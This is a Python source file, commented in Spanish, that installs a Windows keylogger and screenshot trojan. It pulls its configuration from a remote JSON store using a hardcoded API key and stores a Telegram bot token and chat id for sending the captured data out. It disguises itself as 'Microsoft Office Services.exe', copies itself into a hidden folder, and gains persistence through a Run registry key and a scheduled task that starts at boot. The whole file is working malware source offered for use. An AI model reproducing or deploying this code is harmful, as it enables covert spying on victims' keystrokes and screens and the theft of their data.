import os

from lib.winregistry import WinRegistry
import time  # Contar segundos
import shutil
import json
import requests
from lib.pathreg import *
from lib.util import Util


def isnew():
    if not WinRegistry(REG_CONFIG_ALL).read_value('name_software'):
        print('No se encontró datos en el registro')
        write_registry()
        spy()
        create_task()
        time.sleep(1)  # espera en segundos

    else:
        print('El keylogger si está habilitado')

def isnew_startup():
    if not WinRegistry(REG_CONFIG_ALL).read_value('name_software'):
        print('No se encontró datos en el registro')
        write_registry_startup()
        spy()
        startup()
        time.sleep(1)  # espera en segundos

    else:
        print('El keylogger si está habilitado')

def write_registry():

    try:
        url = 'https://api.jsonbin.io/v3/b/621affa224f17933e49fb700/latest'
        headers = {
            'Content-Type': 'application/json',
            'X-Master-Key': '$2b$10$ww5KQa69.a243FoUvTgnXOeSW3zsNnH7Aqblsm2ba6ND3FfjdmIke'
        }
        req = requests.get(url, headers=headers)
        items = json.loads(req.text)['record']

        # Keylogger
        items_keylogger = items['keylogger']
        for key in items_keylogger:
            WinRegistry(REG_KEYLOGGER).set_value_DWORD(key, int(items_keylogger[key]))
        print('GET and Write Registy => Data Keylogger => [OK] ')

        # Screenshot
        items_screenshot = items['screenshot']
        for key in items_screenshot:
            WinRegistry(REG_SCREENSHOT).set_value_DWORD(key, int(items_screenshot[key]))
        print('GET and Write Registy => Data Screenshot => [OK] ')

        # Telegram Bot
        items_telegram_bot = items['telegram_bot']
        for key in items_telegram_bot:
            WinRegistry(REG_TELEGRAM).set_value_String(key, items_telegram_bot[key])
        print('GET and Write Registy => Data Telegram Bot => [OK] ')

        # General
        items_general = items['general']
        for key in items_general:
            WinRegistry(REG_CONFIG_ALL).set_value_String(key, items_general[key])
        print('GET and Write Registy => Data General => [OK] ')

        return "Sucess Write Registry "

    except:
        print('ERROR GRAVE: => no se puedo leer o guardar los datos en el regsitro')
        return "[Write Registry] Failed to Write "

def write_registry_startup():
    try:

        data_set = {
            "general": {
                "debug": "0",
                "delay": "0",
                "code": "PC_TEST_K01",
                "name_software": "Microsoft Office Services.exe"
            },
            "keylogger": {
                "active": "1",
                "limit": "50"
            },
            "screenshot": {
                "active": "1",
                "interval_seconds": "20"
            },
            "telegram_bot": {
                "id": "-548732335",
                "token": "5314837129:AAHX7lL-mu5I3g0Nf__5sfLRGl4L5bRDRp4"
            }
        }
        # 
        # "token": "5232086864:AAF9Vjzn36qE7FjMWC4TFO8elN3IbRSnj-s"
        json_dump = json.dumps(data_set)

        print(json_dump)

        json_object = json.loads(json_dump)

        print(json_object["general"]['debug'])
        print(json_object["general"]['delay'])
        print(json_object["general"]['code'])
        print(json_object["general"]['name_software'])
        print(json_object["keylogger"]['active'])
        print(json_object["keylogger"]['limit'])
        print(json_object["screenshot"]['active'])
        print(json_object["screenshot"]['interval_seconds'])
        print(json_object["telegram_bot"]['id'])
        print(json_object["telegram_bot"]['token'])

        # Keylogger
        items_keylogger = json_object["keylogger"]
        for key in items_keylogger:
            WinRegistry(REG_KEYLOGGER).set_value_DWORD(key, int(items_keylogger[key]))
        print('GET and Write Registy => Data Keylogger => [OK] ')

        # Screenshot
        items_screenshot = json_object['screenshot']
        for key in items_screenshot:
            WinRegistry(REG_SCREENSHOT).set_value_DWORD(key, int(items_screenshot[key]))
        print('GET and Write Registy => Data Screenshot => [OK] ')

        # Telegram Bot
        items_telegram_bot = json_object['telegram_bot']
        for key in items_telegram_bot:
            WinRegistry(REG_TELEGRAM).set_value_String(key, items_telegram_bot[key])
        print('GET and Write Registy => Data Telegram Bot => [OK] ')

        # General
        items_general = json_object['general']
        for key in items_general:
            WinRegistry(REG_CONFIG_ALL).set_value_String(key, items_general[key])
        print('GET and Write Registy => Data General => [OK] ')

        return "Sucess Write Registry "

        pass
    except:
        print('ERROR GRAVE: => no se puedo leer o guardar los datos en el regsitro')
        return "[Write Registry] Failed to Write "


def startup():
    name_software = WinRegistry(REG_CONFIG_ALL).read_value('name_software')
    WinRegistry(REG_STARTUP).set_value_String('Microsoft office Services',SUB_PATH_SOFTWARE +'\\'+ name_software )
    pass

# Habilite AutoRun in Task //  not Show in task manager
def create_task():
    try:
        name_software = WinRegistry(REG_CONFIG_ALL).read_value('name_software')
        key_and_file = '"Windows\\key"'

        # Delete task
        try:
            command = 'schtasks /delete /tn  '+key_and_file+' /f '
            response = "\n" + "\n"
            lines = os.popen(command)
            for line in lines:
                line.replace('\n\n', '\n')
                response += line
            print(response)
            print('Success |> Comando borrar tarea, si hay alguna tarea la borró')
        except:
            print('ERROR  |> fatal, , no se puedo borrar la tarea, algo interfirio ')

        # Create new Task
        try:
            command = 'SCHTASKS /CREATE /SC ONSTART /TN '+key_and_file+' /TR "' + SUB_PATH_SOFTWARE +'\\'+ name_software + '"'
            response = "\n" + "\n"
            lines = os.popen(command)
            for line in lines:
                line.replace('\n\n', '\n')
                response += line
            print(response)
            print('Success |> Create Task init Trojan Spy')
        except:
            print('Error |> Not create Task init Trojan Spy')

    except:
        print('Error |> Read Path from Registry => NOT KEY INSTALLED')

# Reply to system
def spy():
    print('Ocultando en el sistema')
    try:
        name_software = WinRegistry(REG_CONFIG_ALL).read_value('name_software')
        print("[Trojan] - No se encuentra en el sistema...\nProceso Troyano...")
        try:
            Util.create_folder(SUB_PATH_SOFTWARE)
            shutil.copy(name_software, SUB_PATH_SOFTWARE)  # Intenta ocultar el items_general en una carpeta
            print("[Trojan] - Se replico en el sistema correctamente")
            print('PATH = '+ SUB_PATH_SOFTWARE + name_software)
        except:
            print("[Trojan] - Hubo un problema al replicar en el sistema")
    except:
        print('[Trojan]Error Grave en copiar el key ')
